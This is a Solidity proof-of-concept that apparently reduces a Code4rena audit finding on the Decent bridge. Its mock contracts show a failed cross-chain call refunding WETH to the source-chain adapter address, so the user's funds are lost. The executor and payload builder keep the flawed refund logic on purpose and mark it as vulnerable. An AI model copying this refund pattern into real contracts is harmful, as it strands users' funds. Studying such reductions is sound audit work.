// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Decent — [H-03] When DecentBridgeExecutor.execute fails, funds go to a wrong address
    (Code4rena 2024-01-decent; #30561)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: source-chain _getCallParams encodes msg.sender (the BridgeAdapter)
    as `from`. On destination, when the target call fails, _executeWeth refunds
    `from` — an address that is NOT a contract on the destination chain (adapters
    are not CREATE2-deployed), so refunded WETH is permanently lost to a phantom
    address. Vulnerable encode + refund lines preserved (@>). */

contract MockWETH {
    string public name = "Wrapped Ether";
    string public symbol = "WETH";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        uint256 a = allowance[from][msg.sender];
        require(a >= amount, "allow");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Always-reverting target so the executor takes the failure refund path.
contract FailingTarget {
    fallback() external payable {
        revert("target fails");
    }
    receive() external payable {
        revert("target fails");
    }
}

/// @dev Reduced DecentBridgeExecutor — onlyOwner omitted for local wiring; refund bug intact.
contract DecentBridgeExecutor {
    MockWETH public weth;
    bool public gasCurrencyIsEth;

    constructor(address _weth, bool gasIsEth) {
        weth = MockWETH(payable(_weth));
        gasCurrencyIsEth = gasIsEth;
    }

    function _executeWeth(
        address from,
        address target,
        uint256 amount,
        bytes memory callPayload
    ) private {
        uint256 balanceBefore = weth.balanceOf(address(this));
        weth.approve(target, amount);

        (bool success,) = target.call(callPayload);

        if (!success) {
            weth.transfer(from, amount); // @> VULN: refunds `from` = SOURCE-chain adapter address, not the user
            return;
        }

        uint256 remainingAfterCall = amount - (balanceBefore - weth.balanceOf(address(this)));
        weth.transfer(from, remainingAfterCall);
    }

    function execute(
        address from,
        address target,
        bool deliverEth,
        uint256 amount,
        bytes memory callPayload
    ) public {
        weth.transferFrom(msg.sender, address(this), amount);

        if (!gasCurrencyIsEth || !deliverEth) {
            _executeWeth(from, target, amount, callPayload);
        } else {
            // ETH path omitted in this reduction (same refund bug).
            _executeWeth(from, target, amount, callPayload);
        }
    }
}

/// @dev Source-side payload builder — encodes msg.sender as `from` (verbatim bug).
contract DecentEthRouterSource {
    uint8 public constant MT_ETH_TRANSFER_WITH_PAYLOAD = 1;

    function buildPayload(
        address _toAddress,
        bool deliverEth,
        bytes memory additionalPayload
    ) external view returns (bytes memory payload) {
        payload = abi.encode(
            MT_ETH_TRANSFER_WITH_PAYLOAD,
            msg.sender, // @> VULN: source BridgeAdapter encoded as refund `from` (wrong on dest)
            _toAddress,
            deliverEth,
            additionalPayload
        );
    }
}

/// @dev Stand-in for source-chain DecentBridgeAdapter (NOT deployed on dest in production).
contract SourceBridgeAdapter {
    DecentEthRouterSource public sourceRouter;

    constructor(address _sourceRouter) {
        sourceRouter = DecentEthRouterSource(_sourceRouter);
    }

    function makePayload(address to, bool deliverEth, bytes memory extra)
        external
        view
        returns (bytes memory)
    {
        return sourceRouter.buildPayload(to, deliverEth, extra);
    }
}

contract Exploit {
    MockWETH public weth; // CREATE 1
    DecentBridgeExecutor public executor; // CREATE 2 — vulnerable refund
    DecentEthRouterSource public sourceRouter; // CREATE 3 — vulnerable encode
    SourceBridgeAdapter public sourceAdapter; // CREATE 4 — phantom refund recipient
    FailingTarget public target; // CREATE 5
    address public user; // CREATE-less — intended recipient (0xBEEF)

    uint256 public constant AMOUNT = 10 ether;

    constructor() {
        weth = new MockWETH();
        executor = new DecentBridgeExecutor(address(weth), false);
        sourceRouter = new DecentEthRouterSource();
        sourceAdapter = new SourceBridgeAdapter(address(sourceRouter));
        target = new FailingTarget();
        user = address(0xBEEF);
    }

    function run() external {
        // 1) Source adapter builds cross-chain payload — encodes itself as `from`.
        bytes memory payload = sourceAdapter.makePayload(address(target), false, bytes(""));

        // 2) Destination decodes the payload the same way onOFTReceived does.
        (uint8 msgType, address _from, address _to, bool deliverEth, bytes memory callPayload) =
            abi.decode(payload, (uint8, address, address, bool, bytes));
        msgType;
        require(_from == address(sourceAdapter), "from is source adapter");
        require(_to == address(target), "to is failing target");
        require(_from != user, "from must not be the real user");

        // 3) Fund the destination delivery (OFT credited WETH to the dest router / us).
        weth.mint(address(this), AMOUNT);
        weth.approve(address(executor), AMOUNT);

        uint256 phantomBefore = weth.balanceOf(address(sourceAdapter));
        uint256 userBefore = weth.balanceOf(user);

        // 4) Target call fails → refund goes to `_from` (source adapter address on dest).
        executor.execute(_from, _to, deliverEth, AMOUNT, callPayload);

        // Harm: full transfer amount permanently misdirected to a phantom address.
        require(weth.balanceOf(address(sourceAdapter)) == phantomBefore + AMOUNT, "refund to phantom");
        require(weth.balanceOf(user) == userBefore, "user got nothing");
        require(weth.balanceOf(address(target)) == 0, "target got nothing");
        require(_from != user, "wrong refund recipient");
    }
}
